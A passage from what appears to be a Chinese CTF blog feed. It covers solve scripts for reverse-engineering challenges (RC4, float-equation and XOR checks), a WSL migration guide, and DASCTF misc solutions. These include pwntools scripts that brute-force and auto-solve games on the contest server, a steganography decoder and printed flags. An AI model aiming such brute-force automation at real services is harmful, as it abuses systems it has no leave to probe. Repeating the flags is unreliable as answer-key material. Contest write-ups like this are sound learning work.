class="keyword">char</span> key[keyLen+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> data[dataLen+<span class="number">1</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    hex2char(key_hex,key,keyLen*<span class="number">2</span>);</span><br><span class="line">    hex2char(data_hex,data,dataLen*<span class="number">2</span>);</span><br><span class="line">    RC4(key,keyLen,data,dataLen);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n[*]RC4 Encrypt/Decrypt result: &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dataLen;i++) <span class="built_in">printf</span>(<span class="string">&quot;%02x&quot;</span>,data[i]);</span><br><span class="line">    <span class="comment">// printf(&quot;\n%s&quot;,data);</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>把<code>666c61677b63356530663566362d663739652d356239622d393838662d3238663034363131373830327d</code>unhex一下有：</p><p><strong>flag{c5e0f5f6-f79e-5b9b-988f-28f046117802}</strong></p><h2 id="抛石机"><a href="#抛石机" class="headerlink" title="抛石机"></a>抛石机</h2><p>没有花指令，逻辑很清晰。</p><p>这里是将输入丢进循环中，如果<code>v15[i] = &#39;x&#39;</code>，那么只要<code>sub_1155(v4)&gt;=0</code>就能过check，并将对应字符存入数组<code>v16</code>中。</p><p><img src="/p/wpFor-2021lcb/image-20211007153017036.png"></p><p>后面就是把之前存的<code>v16</code>两个一组丢进<code>sub_1198</code>中，并把结果保存进对应的新的数组里。</p><p>（有一点乱序存储的感觉，内存里依次是<code>byte_4048</code>、<code>byte_4050</code>、<code>byte_4058</code>、<code>byte_4060</code>）</p><p><img src="/p/wpFor-2021lcb/image-20211007153422079.png"></p><p>调的时候会发现保存在高四字节中，低四字节默认是零：</p><p><img src="/p/wpFor-2021lcb/Untitled.png"></p><p><code>sub_1155</code>明显是一个单个字母的十六进制转换，而<code>sub_1198</code>就是一个将类似<code>1f</code>转成<code>0x1f</code>的unhex操作。</p><p><img src="/p/wpFor-2021lcb/image-20211007152719087.png"></p><p><img src="/p/wpFor-2021lcb/image-20211007152934792.png"></p><p>最终check就是这个浮点数的check，解一个一元二次方程得到两个解，相对大小确定，需要控制一下精度就行：</p><p><img src="/p/wpFor-2021lcb/image-20211007155237141.png"></p><p>用sage解一下</p><p><img src="/p/wpFor-2021lcb/image-20210929194539160.png"></p><p>然后用这四个浮点数输出几个uint64，然后在十六进制数的基础上调一下精度。</p><p>exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">// double b1 = 1.9776226868128955561048266968;</span></span><br><span class="line">    <span class="comment">// double b2 = 4.3251647224828624129341225296;</span></span><br><span class="line">    <span class="comment">// double b3 = 1.0806323789664129493847180501;</span></span><br><span class="line">    <span class="comment">// double b4 = -0.48267319186340060660987720185;</span></span><br><span class="line">    <span class="comment">// printf(&quot;%lx %lx %lx %lx\n&quot;, *(unsigned long*)&amp;b1, *(unsigned long*)&amp;b2, *(unsigned long*)&amp;b3, *(unsigned long*)&amp;b4);</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> b1 = <span class="number">0x3fffa45800000000</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> b2 = <span class="number">0x40114cf800000000</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> b3 = <span class="number">0x3ff14a4500000000</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> b4 = <span class="number">0xbfdee41e00000000</span>;</span><br><span class="line">    <span class="keyword">double</span> v4 = <span class="number">149.2</span> * *(<span class="keyword">double</span> *)&amp;b3 + *(<span class="keyword">double</span> *)&amp;b3 * <span class="number">-27.6</span> * *(<span class="keyword">double</span> *)&amp;b3 - <span class="number">129.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v3 = <span class="number">149.2</span> * *(<span class="keyword">double</span> *)&amp;b2 + *(<span class="keyword">double</span> *)&amp;b2 * <span class="number">-27.6</span> * *(<span class="keyword">double</span> *)&amp;b2 - <span class="number">129.0</span>;</span><br><span class="line">    <span class="keyword">double</span> v2 = *(<span class="keyword">double</span> *)&amp;b4 * <span class="number">-39.6</span> * *(<span class="keyword">double</span> *)&amp;b4 + <span class="number">59.2</span> * *(<span class="keyword">double</span> *)&amp;b4 + <span class="number">37.8</span>;</span><br><span class="line">    <span class="keyword">double</span> v1 = *(<span class="keyword">double</span> *)&amp;b1 * <span class="number">-39.6</span> * *(<span class="keyword">double</span> *)&amp;b1 + <span class="number">59.2</span> * *(<span class="keyword">double</span> *)&amp;b1 + <span class="number">37.8</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lf %lf %lf %lf\n&quot;</span>, v1, v2, v3, v4);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lx %lx %lx %lx\n&quot;</span>, b1, b2, b3, b4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再拿b1~b4的输出丢进python里按顺序组装回去：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">l = <span class="string">&quot;3fffa45800000000 40114cf800000000 3ff14a4500000000 bfdee41e00000000&quot;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">l = [x[:<span class="number">8</span>] <span class="keyword">for</span> x <span class="keyword">in</span> l]</span><br><span class="line"><span class="comment"># print(l)</span></span><br><span class="line">b = [<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> l:</span><br><span class="line">    b.append(<span class="built_in">bytes</span>.fromhex(x)[::<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">flag = b[<span class="number">3</span>] + b[<span class="number">2</span>] + b[<span class="number">4</span>] + b[<span class="number">1</span>]</span><br><span class="line">flag = flag.<span class="built_in">hex</span>()</span><br><span class="line">print(<span class="string">&#x27;flag&#123;&#x27;</span>+flag[:<span class="number">8</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">8</span>:<span class="number">12</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">12</span>:<span class="number">16</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">16</span>:<span class="number">20</span>]+<span class="string">&#x27;-&#x27;</span>+flag[<span class="number">20</span>:]+<span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><strong>flag{454af13f-f84c-1140-1ee4-debf58a4ff3f}</strong></p><h2 id="babyvxworks"><a href="#babyvxworks" class="headerlink" title="babyvxworks"></a>babyvxworks</h2><p>VxWorks不会，瞎逆。</p><blockquote><p>后来听出题人说调起来就行了（逃</p></blockquote><p>去掉花指令，可以看到关键加密代码</p><p><img src="/p/wpFor-2021lcb/image-20211007204443723.png"></p><p><img src="/p/wpFor-2021lcb/image-20210929200428012-16335978094703.png" alt="image-20210929200428012"></p><p>上面是已知数组，下面可能进行了什么操作，但主操作是xor 0x22和+3，并且循环次数是这个已知数组的长度。</p><p>写exp有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">arr = [<span class="number">188</span>,<span class="number">10</span>,<span class="number">187</span>,<span class="number">193</span>,<span class="number">213</span>,<span class="number">134</span>,<span class="number">127</span>,<span class="number">10</span>,<span class="number">201</span>,<span class="number">185</span>,<span class="number">81</span>,<span class="number">78</span>,<span class="number">136</span>,<span class="number">10</span>,<span class="number">130</span>,<span class="number">185</span>,<span class="number">49</span>,<span class="number">141</span>,<span class="number">10</span>,<span class="number">253</span>,<span class="number">201</span>,<span class="number">199</span>,<span class="number">127</span>,<span class="number">185</span>,<span class="number">17</span>,<span class="number">78</span>,<span class="number">185</span>,<span class="number">232</span>,<span class="number">141</span>,<span class="number">87</span>]</span><br><span class="line">flag = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> arr:</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(arr)):</span><br><span class="line">        x = ((x<span class="number">-3</span>)&amp;<span class="number">0xff</span>) ^ <span class="number">0x22</span></span><br><span class="line">    flag.append(x)</span><br><span class="line">print(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, flag)))</span><br></pre></td></tr></table></figure><p><strong>flag{helo_w0rld_W3lcome_70_R3}</strong></p>]]></content>
      
      
      <categories>
          
          <category> Write up </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WSL/WSL2迁移笔记</title>
      <link href="p/blogsFor-migrating-wsl/"/>
      <url>p/blogsFor-migrating-wsl/</url>
      
        <content type="html"><![CDATA[<p>WSL默认把虚拟磁盘装在C盘，所以很容易导致C盘爆炸&#x3D; &#x3D;</p><p>为了帮C盘减轻负担，于是有了这篇WSL的迁移笔记。</p><a id="more"></a><h1 id="查看wsl列表"><a href="#查看wsl列表" class="headerlink" title="查看wsl列表"></a>查看wsl列表</h1><p>首先用</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl -<span class="literal">-list</span> -<span class="literal">-all</span> <span class="literal">-v</span></span><br></pre></td></tr></table></figure><p>查看当前的子系统</p><p><img src="/p/blogsFor-migrating-wsl/image-20210924203303767.png"></p><p>这边我们要迁移的是我日常默认使用的<code>Ubuntu-18.04</code>（可以看到现在是处于running状态，并且是wsl默认启动的子系统）。</p><h1 id="wsl导出备份"><a href="#wsl导出备份" class="headerlink" title="wsl导出备份"></a>wsl导出备份</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl -<span class="literal">-export</span> 子系统名称 备份包存放路径</span><br></pre></td></tr></table></figure><p>导出备份tar包</p><p><img src="/p/blogsFor-migrating-wsl/image-20210924205543288.png"></p><h1 id="注销原wsl"><a href="#注销原wsl" class="headerlink" title="注销原wsl"></a>注销原wsl</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl -<span class="literal">-unregister</span> 子系统名称</span><br></pre></td></tr></table></figure><p><img src="/p/blogsFor-migrating-wsl/image-20210924205656406.png"></p><p>这时再用<code>wsl --list --all -v</code>查看就会发现该子系统已不存在了</p><p><img src="/p/blogsFor-migrating-wsl/image-20210924205753841.png"></p><h1 id="导入wsl"><a href="#导入wsl" class="headerlink" title="导入wsl"></a>导入wsl</h1><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wsl -<span class="literal">-import</span> 子系统名称 新路径 备份包存放路径</span><br></pre></td></tr></table></figure><p>其中新路径要为空文件夹</p><p><img src="/p/blogsFor-migrating-wsl/image-20210924213620274.png"></p><h1 id="设置默认登录用户名"><a href="#设置默认登录用户名" class="headerlink" title="设置默认登录用户名"></a>设置默认登录用户名</h1><p>如果此时打开该子系统，会发现是默认以root身份登录的（这肯定不行啊hhh，并且shell也会跟着登录用户还原。</p><p><img src="/p/blogsFor-migrating-wsl/image-20210924214256224.png"></p><p>所以在子系统中用<code>cat /etc/passwd</code>查看用户列表并找到之前用wsl时的默认登录用户名：</p><p><img src="/p/blogsFor-migrating-wsl/image-20210924213918336.png"></p><p>然后在powershell里敲：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">子系统 config -<span class="literal">-default</span><span class="literal">-user</span> 上面的默认登录用户名</span><br></pre></td></tr></table></figure><p><img src="/p/blogsFor-migrating-wsl/image-20210924214203567.png"></p><p>把默认登录用户还原成以前用的那个。</p><p><img src="/p/blogsFor-migrating-wsl/image-20210924214359813.png"></p><p>这样wsl迁移工作就大功告成啦~</p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> zero2one/入门 </tag>
            
            <tag> u5eful </tag>
            
            <tag> 折腾经历 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【wp】2021DASCTF July X CBCTF 4th</title>
      <link href="p/wpFor-2021JulyDASCTF/"/>
      <url>p/wpFor-2021JulyDASCTF/</url>
      
        <content type="html"><![CDATA[<p>第一天打dfjk去了，打完回来看发现逆向一道Golang一道lua，不太想啃，于是干脆光速转行做杂项&#x3D; &#x3D;</p><p>也没想到能差一题就ak杂项了（逃。学到很多，顺手总结总结（RE手要跑路啦）。</p><p><del>回头有空复现一下剩下的那道杂项和那个lua逆向（咕咕咕</del></p><a id="more"></a><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="red-vs-blue"><a href="#red-vs-blue" class="headerlink" title="red_vs_blue"></a>red_vs_blue</h2><p>连上去以后乱答了几次，发现在同一次连接的情况下（重来的时候按<code>y</code>），每一场的预测都是一样的。</p><p><img src="/p/wpFor-2021JulyDASCTF/image-20210801204741907.png"></p><p>所以直接pwntools连上去爆破即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># ------ Python2 ------</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">host=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">25384</span></span><br><span class="line">r=remote(host,port)</span><br><span class="line"></span><br><span class="line">myInput=<span class="string">&#x27;&#x27;</span></span><br><span class="line">pred=<span class="string">&#x27;rb&#x27;</span></span><br><span class="line">cnt=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.sendline(pred[cnt%<span class="number">2</span>])</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    rslt=r.recvline()</span><br><span class="line">    print(pred[cnt%<span class="number">2</span>],rslt)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;successful&#x27;</span> <span class="keyword">in</span> rslt:</span><br><span class="line">        myInput+=pred[cnt%<span class="number">2</span>]</span><br><span class="line">        print(<span class="string">&quot;[input] -&gt; &quot;</span>+myInput)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(myInput)==<span class="number">66</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.sendline(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> myInput:</span><br><span class="line">            r.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">            r.recvline()</span><br><span class="line">            r.sendline(x)</span><br><span class="line">            r.recvline()</span><br><span class="line">            r.recvline()</span><br><span class="line">            r.recvline()</span><br><span class="line">        cnt+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021JulyDASCTF/image-20210801212244559.png"></p><p><strong>flag{783e1bfd-0803-47b6-b302-28591dcb9fca}</strong></p><h2 id="funny-maze"><a href="#funny-maze" class="headerlink" title="funny_maze"></a>funny_maze</h2><p>连上去发现是走迷宫，3和2都看了一下分别是：</p><p><img src="/p/wpFor-2021JulyDASCTF/image-20210801212517120.png"></p><p>要点在：输入路径的长度，并且有时间限制。</p><p>一开始以为这个<code>and</code>的意思是先输入路径再输入长度，结果写完脚本以后一直跑都不对，甚至跑去问工作人员了（x）。后来看到有解，才发现应该是自己理解出了问题XD</p><p>去年年底打zhb的时候也有一道杂项是远程迷宫（当时写过一版bfs），于是直接拿来改了，微调了一下recvline的次数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># ------ Python2 ------</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># import time</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># t=time.clock()</span></span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">host=<span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">port=<span class="number">29294</span></span><br><span class="line">r=remote(host,port)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&#x27;game\n&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">dirs=[[<span class="number">0</span>,<span class="number">1</span>],[<span class="number">1</span>,<span class="number">0</span>],[<span class="number">0</span>,<span class="number">-1</span>],[<span class="number">-1</span>,<span class="number">0</span>]]</span><br><span class="line">flag_char=<span class="string">&#x27;dsaw&#x27;</span></span><br><span class="line">cntSuccess=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">if</span> cntSuccess==<span class="number">0</span>:</span><br><span class="line">        maze=r.recvuntil(<span class="string">&#x27;answer:\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[:<span class="number">-1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        maze=r.recvuntil(<span class="string">&#x27;answer:\n&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">3</span>:<span class="number">-1</span>]</span><br><span class="line">    cntSuccess+=<span class="number">1</span></span><br><span class="line">    print(<span class="string">&quot;------&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> rows <span class="keyword">in</span> maze:</span><br><span class="line">        print(<span class="string">&#x27;&#x27;</span>.join(rows))</span><br><span class="line">    print(<span class="string">&quot;------&quot;</span>)</span><br><span class="line">    maze=[<span class="built_in">list</span>(n) <span class="keyword">for</span> n <span class="keyword">in</span> maze]</span><br><span class="line">    row=<span class="built_in">len</span>(maze)</span><br><span class="line">    col=<span class="built_in">len</span>(maze[<span class="number">0</span>])</span><br><span class="line">    path=[]</span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    book=[[(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(col)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(row)]</span><br><span class="line">    head=<span class="number">0</span></span><br><span class="line">    tail=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">    cnt=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(maze)):</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;S&#x27;</span> <span class="keyword">in</span> maze[i]:</span><br><span class="line">            start=(i,maze[i].index(<span class="string">&#x27;S&#x27;</span>))</span><br><span class="line">            cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;E&#x27;</span> <span class="keyword">in</span> maze[i]:</span><br><span class="line">            end=(i,maze[i].index(<span class="string">&#x27;E&#x27;</span>))</span><br><span class="line">            cnt+=<span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> cnt==<span class="number">2</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    path.append(start)</span><br><span class="line">    book[start[<span class="number">0</span>]][start[<span class="number">1</span>]]=path[head]+(<span class="string">&#x27;*&#x27;</span>,)</span><br><span class="line">    maze[start[<span class="number">0</span>]][start[<span class="number">1</span>]]=<span class="string">&#x27;#&#x27;</span></span><br><span class="line">    isSuccess=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> head&lt;tail:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">            x,y=path[head][<span class="number">0</span>]+dirs[i][<span class="number">0</span>],path[head][<span class="number">1</span>]+dirs[i][<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(row) <span class="keyword">or</span> y <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(col) <span class="keyword">or</span> maze[x][y]==<span class="string">&#x27;#&#x27;</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            maze[x][y]=<span class="string">&#x27;#&#x27;</span></span><br><span class="line">            book[x][y]=path[head]+(flag_char[i],)</span><br><span class="line">            path.append((x,y))</span><br><span class="line">            tail+=<span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> x==end[<span class="number">0</span>] <span class="keyword">and</span> y==end[<span class="number">1</span>]:</span><br><span class="line">                isSuccess=<span class="number">1</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> isSuccess==<span class="number">1</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        head+=<span class="number">1</span></span><br><span class="line">    cur=book[end[<span class="number">0</span>]][end[<span class="number">1</span>]]</span><br><span class="line">    <span class="keyword">while</span> cur[<span class="number">2</span>]!=<span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">        flag+=cur[<span class="number">2</span>]</span><br><span class="line">        cur=book[cur[<span class="number">0</span>]][cur[<span class="number">1</span>]]</span><br><span class="line">    flag=flag[::<span class="number">-1</span>]</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(flag)+<span class="number">1</span>))</span><br><span class="line">    print(flag)</span><br><span class="line">    <span class="keyword">if</span> cntSuccess==<span class="number">4</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># print(&#x27;time: &#x27;,round(time.clock()-t,2),&#x27;s&#x27;)</span></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><img src="/p/wpFor-2021JulyDASCTF/image-20210801213047317.png"></p><p>拿到flag：<strong>flag{a2189c60-2011-4e1d-a369-28f6417fe0f7}</strong></p><h2 id="ezSteganography"><a href="#ezSteganography" class="headerlink" title="ezSteganography"></a>ezSteganography</h2><p>图片隐写题，拿到手第一步当然是拿Stegsolve翻啦~果然能翻到一些不同寻常的东西：</p><p><img src="/p/wpFor-2021JulyDASCTF/image-20210801213402811.png"></p><p>看到Green plane 0时黑点点突然密集了，感觉是LSB，于是解了一下：</p><p><img src="/p/wpFor-2021JulyDASCTF/image-20210801213526432.png"></p><p>看到开头有典型的png文件头，猜测是一张png，所以直接<code>Save Bin</code>然后改后缀名为png，得到：</p><p><img src="/p/wpFor-2021JulyDASCTF/green0.png"></p><p>拿到flag的前半部分<strong>flag{2e9ec6480d0515</strong>和提示关键词<code>QIM quantizetion</code>，查了一下是QIM量化，并且给出了步长为20。</p><p>在github上找了几个脚本都不能直接用，看了一眼相关论文，最后拿<a href="https://github.com/pl561/QuantizationIndexModulation/blob/master/qim.py">QuantizationIndexModulation&#x2F;qim.py at master · pl561&#x2F;QuantizationIndexModulation</a>的脚本改了一下，对原图进行处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QIM</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, delta</span>):</span></span><br><span class="line">        self.delta = delta</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">embed</span>(<span class="params">self, x, m</span>):</span></span><br><span class="line">        x = x.astype(<span class="built_in">float</span>)</span><br><span class="line">        d = self.delta</span><br><span class="line">        y = np.<span class="built_in">round</span>(x/d) * d + (<span class="number">-1</span>)**(m+<span class="number">1</span>) * d/<span class="number">4.</span></span><br><span class="line">        <span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">detect</span>(<span class="params">self, z</span>):</span></span><br><span class="line">        shape = z.shape</span><br><span class="line">        z = z.flatten()</span><br><span class="line">        m_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line">        z_detected = np.zeros_like(z, dtype=<span class="built_in">float</span>)</span><br><span class="line">        z0 = self.embed(z, <span class="number">0</span>)</span><br><span class="line">        z1 = self.embed(z, <span class="number">1</span>)</span><br><span class="line">        d0 = np.<span 